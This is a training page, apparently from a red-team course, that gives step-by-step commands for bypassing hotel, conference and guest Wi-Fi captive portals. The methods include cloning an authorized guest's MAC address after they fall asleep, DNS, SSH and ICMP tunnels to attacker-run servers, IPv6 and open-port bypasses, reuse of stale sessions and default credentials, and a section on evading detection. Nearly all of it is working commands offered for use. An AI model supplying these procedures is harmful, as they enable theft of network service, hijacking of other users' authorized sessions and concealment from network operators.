---
layout: training-page
title: "Captive Portal Bypass — Red Team Academy"
module: "Wireless"
tags:
  - captive-portal
  - wireless
  - mac-spoofing
  - dns-tunneling
  - bypass
page_key: "wireless-captive-portal"
render_with_liquid: false
---

# Captive Portal Bypass

Captive portals gate internet/network access behind a web page (hotel Wi-Fi, conference Wi-Fi, corporate guest networks) requiring login, payment, or agreement to terms. Most implementations are trivially bypassed via MAC cloning, DNS tunneling, or leveraging pre-authenticated session data.

## Method 1: MAC Address Cloning (Most Reliable)

```bash
# Captive portals track authorization by MAC address
# If you can identify an already-authorized device, clone its MAC

# Step 1: Scan for active clients on the SSID
# Passive: listen for ARP or DHCP traffic
tcpdump -i wlan0 'arp' -e
# Shows MAC addresses of active devices sending ARP

# Active: connect to portal SSID, run arp scan
arp-scan --interface=wlan0 -l
nmap -sn --disable-arp-ping 192.168.1.0/24  # if you get a DHCP address in captive zone

# Step 2: Identify an authorized device
# Look for devices sending traffic to port 80/443 (authorized = they pass captive portal)
# Phones and laptops with active sessions are ideal targets

# Step 3: Wait for the target device to disconnect or sleep
# Hotel rooms: wait until late at night when the target sleeps
# Conference Wi-Fi: targets come and go frequently

# Step 4: Clone the MAC and reconnect
ip link set wlan0 down
ip link set wlan0 address AA:BB:CC:DD:EE:FF   # cloned MAC
ip link set wlan0 up
dhclient wlan0  # get IP
# Test connectivity: curl -I https://google.com

# Automate with macchanger
macchanger -m AA:BB:CC:DD:EE:FF wlan0
```

## Method 2: DNS Tunneling (Portal Allows DNS)

```bash
# Most captive portals pass DNS queries before authentication
# DNS tunneling encodes arbitrary data in DNS queries/responses
# Allows full TCP/IP tunnel through the portal without any login

# iodine — DNS tunneling tool (client + server)
# Requires: a domain you control + a public server running iodined

# Server setup (your VPS):
iodined -f -c -P password 10.0.0.1 tunnel.yourdomain.com
# Set DNS: NS record for tunnel.yourdomain.com → your VPS IP

# Client (on captive portal network):
iodine -f -P password tunnel.yourdomain.com
# Creates tun0 interface with IP 10.0.0.2

# Route traffic through the tunnel
ip route add default via 10.0.0.1 dev tun0

# Verify
curl --interface tun0 https://example.com

# Speed: DNS tunneling is slow (20-100 kbps) but works for SSH, shell access
```

## Method 3: HTTP/HTTPS Tunnel via Allowed Hosts

```bash
# Some portals allow HTTPS to specific hosts before auth
# (OS X captive portal detection, Microsoft NCSI, etc.)
# If the portal passes 443 to certain IPs/domains, you can tunnel through them

# Check what's allowed before auth:
# Windows sends: http://www.msftconnecttest.com/connecttest.txt
# macOS sends:   http://captive.apple.com/hotspot-detect.html
# Android sends: http://connectivitycheck.gstatic.com/generate_204

# If HTTPS is open to any host (common misconfiguration):
# Set up a sshuttle or SSH tunnel through a server on port 443

# SSH on port 443 (your server must listen on 443):
ssh -D 1080 -p 443 user@yourserver.com
# Set browser proxy: SOCKS5 localhost:1080

# Or: HTTPTunnel — creates TCP tunnel over HTTP
apt install httptunnel
# Server: hts -F localhost:22 80  (or 443)
# Client: htc -F 8022 yourserver.com:80
# Then: ssh -p 8022 user@localhost
```

## Method 4: IPv6 Bypass

```bash
# Many captive portals only filter IPv4
# If the AP provides an IPv6 address via SLAAC, you may have direct internet access

# Check for IPv6 address after connecting
ip addr show wlan0 | grep inet6
# Look for 2xxx::/128 or fe80::/128 (link-local only = no bypass)

# If you have a global IPv6 (2001:xxx or 2600:xxx etc.):
curl -6 https://google.com  # test if it works

# Ping IPv6 DNS
ping6 2001:4860:4860::8888  # Google IPv6 DNS
```

## Method 5: Access via Already-Open Ports

```bash
# Scan for open ports that bypass the captive portal redirect
# Portals typically redirect TCP 80/443 — other ports may pass freely

# Nmap the gateway or internet IPs via non-standard ports
nmap -Pn -p 22,53,8080,8443,9001,1194 yourvpsip.com

# If SSH (22) is open: tunnel everything
ssh -D 1080 user@yourvpsip.com

# If OpenVPN UDP 1194 is open:
openvpn --config yourprofile.ovpn

# DNS over UDP (53) may be allowed — use iodine (see Method 2)
# ICMP sometimes passes captive portals — use ptunnel
apt install ptunnel
# Server: ptunnel -x password
# Client: ptunnel -p yourserver.com -lp 8022 -da yourserver.com -dp 22 -x password
# Then: ssh -p 8022 localhost
```

## Method 6: Portal Credential Reuse

```bash
# Hotels/conferences often reuse simple credentials
# Common default credentials to try:
# room number + last 4 digits of phone number
# 0000, 1234, conference name, hotel name

# OSINT the captive portal:
# - Check hotel/venue review sites for shared Wi-Fi passwords
# - Social media: search "[hotel name] wifi password"
# - Ask at the front desk (social engineering)

# Check if portal accepts expired/stale tokens
# Some portals don't invalidate sessions on checkout
# Finding a session cookie from a previous guest in browser storage
```

## Automated Tool: Nodogsplash / OpenNDS Research

```bash
# Many captive portals run Nodogsplash, OpenNDS, or CoovaChilli
# Vulnerability research has identified authentication bypasses:

# CoovaChilli UAM bypass (if misconfigured):
# Some versions allow direct access by sending specific User-Agent
curl -A "NintendoWiiU" http://captive-portal-ip/

# Router-based portals (MikroTik HotSpot):
# Check for default credentials on management interface
# https://192.168.1.1 → admin / (blank)
```

## Detection Evasion

```bash
# After bypass, restore your real MAC to avoid tracking
macchanger -p wlan0  # restore permanent MAC

# Use VPN immediately after bypass — portal logs source IPs
# Rotate MAC periodically during extended use
# Use Tor over the DNS tunnel for anonymity
```

## Resources

- iodine — `github.com/yarrick/iodine`
- HTTPTunnel — `nocrew.org/software/httptunnel.html`
- ptunnel — `github.com/utoni/ptunnel-ng`
- macchanger — `github.com/alobbs/macchanger`
- CoovaChilli — `coova.github.io/CoovaChilli/`
